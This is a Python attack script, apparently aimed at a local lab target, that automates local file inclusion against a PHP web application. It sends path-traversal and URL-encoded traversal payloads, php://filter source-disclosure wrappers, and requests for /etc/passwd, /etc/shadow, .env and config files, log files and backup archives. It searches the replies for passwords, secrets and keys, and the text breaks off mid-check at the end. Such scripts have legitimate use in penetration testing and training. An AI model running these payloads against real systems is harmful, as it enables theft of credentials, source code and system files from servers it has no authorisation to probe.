import requests
import re
from urllib.parse import quote

BASE_URL = "http://127.0.0.1:32832"
TIMEOUT = 5
catch_all_size = 5609

print("=" * 80)
print("FILE INCLUSION / LFI VULNERABILITY TESTING")
print(f"Target: {BASE_URL}")
print("=" * 80)

# Test parameters that might trigger file inclusion
file_params = ['deep', 'file', 'page', 'include', 'path', 'dir', 'module', 'template', 'view', 'go', 'p']

# Files to attempt including
test_files = [
    # Local files (relative paths discovered)
    'index.php', 'login.php', 'home.php', 'about.php', 'contact.php', 'admin/index.php',
    
    # Sensitive system files
    '/etc/passwd', '/etc/hosts', '/etc/group', '/etc/shadow', '/etc/issue',
    
    # Configuration files
    '/var/www/html/config.php', '/var/www/html/settings.php', '/var/www/html/.env',
    '/var/www/html/wp-config.php', '/var/www/html/database.php', '/var/www/html/config.inc.php',
    
    # Relative path traversal
    '../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd',
    '../../../../var/www/html/config.php', '../../../config.php', '../../config.php',
    
    # Absolute paths
    '/var/www/html/index.php', '/var/www/html/login.php', '/var/www/html/admin/index.php',
]

# PHP wrappers for source code disclosure
php_wrappers = [
    'php://filter/convert.base64-encode/resource=',
    'php://filter/read=convert.base64-encode/resource=',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/convert.base64-encode/resource=login.php',
    'php://filter/convert.base64-encode/resource=config.php',
    'php://filter/read=string.rot13/resource=',
    'data://text/plain,test',
]

success_count = 0

print("\n[1] Testing 'deep' Parameter (from source code)")
print("-" * 80)
for test_file in test_files:
    url = f"{BASE_URL}?deep={quote(test_file)}"
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        
        if len(resp.content) != catch_all_size:
            print(f"\n[!] POTENTIAL LFI: {url}")
            print(f"    Size: {len(resp.content)}B (different from catch-all {catch_all_size}B)")
            
            # Analyze response
            if len(resp.content) < 2000:  # Small response, likely file content
                print(f"    [+] File content retrieved!")
                print(f"    Response:\n{resp.text}")
                success_count += 1
                
                # Check if base64 encoded (PHP wrapper success)
                if re.search(r'^[A-Za-z0-9+/]+=*$', resp.text.strip()):
                    print(f"    [+] Base64 encoded content - likely php://filter success!")
            else:
                print(f"    Preview:\n{resp.text[:500]}...")
        
        if success_count >= 3:
            print("    [-] Skipping remaining tests for this parameter")
            break
            
    except Exception as e:
        if "Connection aborted" not in str(e):
            print(f"    [-] Error with {test_file}: {e}")

print("\n[2] Testing 'file' Parameter")
print("-" * 80)
success_count = 0
for test_file in test_files:
    url = f"{BASE_URL}?file={quote(test_file)}"
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        
        if len(resp.content) != catch_all_size:
            print(f"\n[!] POTENTIAL LFI: {url}")
            print(f"    Size: {len(resp.content)}B")
            
            if len(resp.content) < 2000:
                print(f"    [+] File content retrieved!")
                print(f"    Response:\n{resp.text}")
                success_count += 1
            else:
                print(f"    Preview:\n{resp.text[:500]}...")
        
        if success_count >= 3:
            break
            
    except Exception as e:
        pass

print("\n[3] Testing 'page' Parameter")
print("-" * 80)
success_count = 0
for test_file in test_files:
    if test_file.startswith('/usr'):
        continue  # Skip some to speed up
    url = f"{BASE_URL}?page={quote(test_file)}"
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        
        if len(resp.content) != catch_all_size:
            print(f"\n[!] POTENTIAL LFI: {url}")
            print(f"    Size: {len(resp.content)}B")
            
            if len(resp.content) < 2000:
                print(f"    [+] File content retrieved!")
                print(f"    Response:\n{resp.text}")
                success_count += 1
        
        if success_count >= 3:
            break
            
    except Exception as e:
        pass

print("\n[4] Testing 'include' Parameter")
print("-" * 80)
success_count = 0
for test_file in test_files[:10]:  # Test only first 10
    url = f"{BASE_URL}?include={quote(test_file)}"
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        
        if len(resp.content) != catch_all_size:
            print(f"\n[!] POTENTIAL LFI: {url}")
            print(f"    Size: {len(resp.content)}B")
            
            if len(resp.content) < 2000:
                print(f"    [+] File content retrieved!")
                print(f"    Response:\n{resp.text}")
                success_count += 1
        
        if success_count >= 3:
            break
            
    except Exception as e:
        pass

print("\n[5] Testing PHP Filter Wrappers for Source Code")
print("-" * 80)
for wrapper in php_wrappers:
    url = f"{BASE_URL}?deep={quote(wrapper)}"
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        
        if len(resp.content) != catch_all_size:
            print(f"\n[!] PHP WRAPPER: {url}")
            print(f"    Size: {len(resp.content)}B")
            
            # Check for base64 in response
            if re.search(r'^[A-Za-z0-9+/]{50,}=*$', resp.text.strip()):
                print(f"    [+] BASE64 SOURCE CODE RETRIEVED!")
                print(f"    Length: {len(resp.text)} characters")
                print(f"    First 500 chars:\n{resp.text[:500]}...")
                
                # Try to decode and show
                import base64
                try:
                    decoded = base64.b64decode(resp.text).decode('utf-8', errors='ignore')
                    print(f"\n    [+] DECODED SOURCE:")
                    print(f"    First 500 chars:\n{decoded[:500]}...")
                except:
                    print(f"    [-] Could not decode base64")
            else:
                print(f"    Response:\n{resp.text[:500]}...")
                
    except Exception as e:
        pass

print("\n[6] Testing Multiple Parameter Techniques")
print("-" * 80)

# Parameter pollution
test_cases = [
    (f"{BASE_URL}?deep=index.php&file=index.php", "Parameter pollution"),
    (f"{BASE_URL}?deep=../../../../etc/passwd", "Double traversal"),
    (f"{BASE_URL}?deep=....//....//....//....//etc/passwd", "Alternative traversal"),
    (f"{BASE_URL}?deep=..%2f..%2f..%2f..%2fetc%2fpasswd", "URL encoded traversal"),
    (f"{BASE_URL}?deep=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Fully encoded traversal"),
]

for url, description in test_cases:
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        
        if len(resp.content) != catch_all_size:
            print(f"\n[!] {description}")
            print(f"    URL: {url}")
            print(f"    Size: {len(resp.content)}B")
            
            if len(resp.content) < 2000:
                print(f"    Response:\n{resp.text}")
                
    except Exception as e:
        pass

print("\n[7] Testing Log File Disclosure")
print("-" * 80)
log_files = [
    '/var/log/apache2/access.log', '/var/log/apache2/error.log',
    '/var/log/nginx/access.log', '/var/log/nginx/error.log',
    '/var/log/httpd/access_log', '/var/log/httpd/error_log',
    'access.log', 'error.log', 'debug.log', 'app.log',
]

for log_file in log_files:
    for param in ['file', 'deep', 'page']:
        url = f"{BASE_URL}?{param}={quote(log_file)}"
        try:
            resp = requests.get(url, timeout=TIMEOUT)
            
            if len(resp.content) > 0 and len(resp.content) != catch_all_size:
                print(f"\n[!] LOG FILE: {url}")
                print(f"    Size: {len(resp.content)}B")
                
                if '127.0.0.1' in resp.text or 'GET' in resp.text:
                    print(f"    [+] LOG FILE CONTENT!")
                    print(f"    Lines: {len(resp.text.split())}")
                    print(f"    Preview:\n{resp.text[:500]}...")
                    
        except Exception as e:
            pass

print("\n[8] Testing Sensitive Application Files")
print("-" * 80)
app_files = [
    '../config.php', '../../config.php', '../../../config.php',
    '../settings.php', '../../settings.php', '../../../settings.php',
    '../.env', '../../.env', '../../../.env',
    '../admin/.htaccess', '../../admin/.htaccess', '../../../.htaccess',
]

for app_file in app_files:
    for param in ['file', 'deep', 'page']:
        url = f"{BASE_URL}?{param}={quote(app_file)}"
        try:
            resp = requests.get(url, timeout=TIMEOUT)
            
            if len(resp.content) > 0 and len(resp.content) != catch_all_size:
                print(f"\n[!] SENSITIVE FILE: {url}")
                print(f"    Size: {len(resp.content)}B")
                
                if len(resp.content) < 2000:
                    print(f"    [+] File content retrieved!")
                    print(f"    Response:\n{resp.text}")
                    
                    # Look for credentials or keys
                    if 'password' in resp.text.lower() or 'secret' in resp.text.lower() or 'key' in resp.text.lower():
                        print(f"    [!] POSSIBLE CREDENTIALS FOUND")
                        
        except Exception as e:
            pass

print("\n" + "=" * 80)
print("LFI TESTING COMPLETE")
print("=" * 80)

# Summary of LFI technique results
total_attempts = len(file_params) * len(test_files) + len(php_wrappers) + len(test_cases)
print(f"\nTotal parameter combinations tested: {total_attempts}")
print("Check above results for successful file inclusions!")

# Check if we can directly access any interesting files
print("\n[9] Direct Access to Potential Backup/Save Files")
print("-" * 80)
backup_files = [
    'backup.zip', 'backup.tar.gz', 'site.zip', 'html.zip',
    'config.php.bak', 'config.php~', 'config.php.old', '.config.php.swp',
    'settings.php.bak', 'settings.php~', '.settings.php.swp',
]

for backup in backup_files:
    url = f"{BASE_URL}/{backup}"
    try:
        resp = requests.get(url, timeout=TIMEOUT)
        if resp.status_code != 404:
            print(f"\n[!] BACKUP FILE: {url}")
            print(f"    Status: {resp.status_code} | Size: {len(resp.content)}B")
            
            # Check for archive signatures
            if len(resp.content) > 4:
                magic = resp.content[:4].hex()
                if magic.startswith('504b') or magic.startswith('1f8b'):
